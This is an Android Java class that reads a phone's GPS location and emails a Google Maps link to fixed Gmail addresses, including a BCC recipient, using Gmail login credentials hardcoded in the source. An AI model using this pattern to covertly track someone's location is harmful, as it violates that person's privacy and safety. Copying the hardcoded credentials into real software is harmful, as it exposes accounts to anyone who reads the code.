package net.lokasi.lokasi;

import android.util.Log;

import java.text.DateFormat;
import java.text.SimpleDateFormat;
import java.util.Date;
import java.util.Properties;

import javax.mail.Message;
import javax.mail.MessagingException;
import javax.mail.PasswordAuthentication;
import javax.mail.Session;
import javax.mail.Transport;
import javax.mail.internet.InternetAddress;
import javax.mail.internet.MimeMessage;

/**
 * Created by ade on 7/16/17.
 */

public class EmailTracker {
    private GPSTracker gpsTracker;
    public EmailTracker(GPSTracker gPSTrackerThis) {
        gpsTracker = gPSTrackerThis;
    }
    public void senEmaiLocation() {
        gpsTracker.getLocation();
        sendEmail();
    }
    private void sendEmail() {
        Properties props = new Properties();
        props.put("mail.smtp.auth", "true");
        props.put("mail.smtp.starttls.enable", "true");
        props.put("mail.smtp.host", "smtp.gmail.com");
        props.put("mail.smtp.port", "587");

        Session session = Session.getInstance(props,
                new javax.mail.Authenticator() {
                    protected PasswordAuthentication getPasswordAuthentication() {
                        return new PasswordAuthentication("migas@gmail.com", "jeruk");
                    }
                });

        try {
            Message message = new MimeMessage(session);
            message.setFrom(new InternetAddress("derta@gmail.com"));

            message.setRecipients(Message.RecipientType.TO, InternetAddress.parse("deriopo@gmail.com"));
            message.setRecipients(Message.RecipientType.BCC, InternetAddress.parse("dervfeere@gmail.com"));

            Date todaysDate = new Date();
            DateFormat dateFormat = new SimpleDateFormat("dd MMMM yyyy HH:mm:ss");
            message.setSubject("Lokasi Handphone tanggal ".concat(dateFormat.format(todaysDate)));

            String description = "<a href=\"http://maps.google.com/?q=";
            description = description.concat(String.valueOf(gpsTracker.getLatitude())).concat(",").concat(String.valueOf(gpsTracker.getLongitude()));
            description = description.concat("\">Click</a><br><br>Jika tidak bisa Link di atas copy link ini <br><br>http://maps.google.com/?q=").concat(String.valueOf(gpsTracker.getLatitude())).concat(",").concat(String.valueOf(gpsTracker.getLongitude()));

            message.setContent(description,"text/html");
            Transport.send(message);
        } catch (MessagingException e) {
            Log.e("tidak".concat(e.getMessage()), "_no");
        }
    }
}
